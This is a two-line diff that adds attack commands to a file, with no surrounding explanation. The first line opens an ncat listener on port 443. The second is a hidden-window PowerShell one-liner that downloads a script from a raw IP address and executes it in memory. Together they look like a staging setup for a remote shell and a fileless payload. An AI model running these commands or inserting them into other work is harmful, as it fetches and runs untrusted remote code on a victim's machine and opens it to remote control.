@@ -1,0 +1,2 @@
+ncat -l -p 443
+powershell -WindowStyle hidden "IEX (New-Object Net.WebClient).DownloadString('http://130.61.72.50:80/Load.ps1');"
